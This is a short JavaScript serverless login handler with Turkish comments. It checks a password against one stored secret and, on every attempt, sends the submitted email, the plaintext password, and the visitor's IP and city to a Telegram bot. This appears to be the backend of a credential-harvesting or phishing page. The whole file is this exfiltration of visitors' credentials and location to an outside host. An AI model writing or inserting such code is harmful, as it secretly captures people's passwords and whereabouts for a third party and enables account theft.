export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    const { email, pass, ipData } = req.body;
    
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_ID;
    const DOGRU_SIFRE = process.env.SIFRE;

    // Şifre kontrolü burada yapılıyor
    const girisBasarili = (pass === DOGRU_SIFRE);

    const mesaj = `🚀 **TERCES GİRİŞ BİLDİRİM**\n📧: ${email}\n🔑: ${pass}\n📡 IP: ${ipData.ip}\n📍: ${ipData.city}\n✅ Durum: ${girisBasarili ? "ŞİFRE DOĞRU" : "HATALI ŞİFRE"}`;

    try {
        // Telegram'a her türlü bilgi gönderiyoruz (kim denemiş gör diye)
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);

        if (girisBasarili) {
            return res.status(200).json({ success: true });
        } else {
            // Şifre yanlışsa hata döndür
            return res.status(401).json({ success: false, message: "Hatalı şifre girdiniz!" });
        }
    } catch (e) {
        return res.status(500).json({ success: false, error: "Sistem hatası" });
    }
}


